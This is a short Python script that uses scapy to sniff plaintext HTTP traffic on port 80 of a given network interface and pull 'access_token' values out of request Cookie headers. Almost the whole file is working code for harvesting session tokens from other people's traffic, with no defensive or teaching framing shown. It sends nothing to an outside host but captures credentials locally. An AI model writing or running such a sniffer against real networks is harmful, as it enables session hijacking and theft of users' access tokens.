import re
import pprint
import sys

from scapy.all import sniff

import scapy_http.http

cookies_pattern = ['access_token=\S*']

def print_cookie(packet):
    if 'Cookie' in packet.getlayer(scapy_http.http.HTTPRequest).fields:
        for pattern in cookies_pattern:
            res = re.search(pattern, packet.getlayer(scapy_http.http.HTTPRequest).fields['Cookie'])
            if res is not None:
                return res.group()
    return None

def print_packet(packet):
    pprint.pprint(packet.getlayer(scapy_http.http.HTTPRequest).fields, indent=2)
    return None


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('USAGE: {} interface'.format(sys.argv[0]))
        exit(1)
    interface = sys.argv[1]

    print('Started...')
    sniff(iface=interface,
          promisc=False,
          filter='tcp and port 80',
          lfilter=lambda x: x.haslayer(scapy_http.http.HTTPRequest),
          prn=print_cookie
    )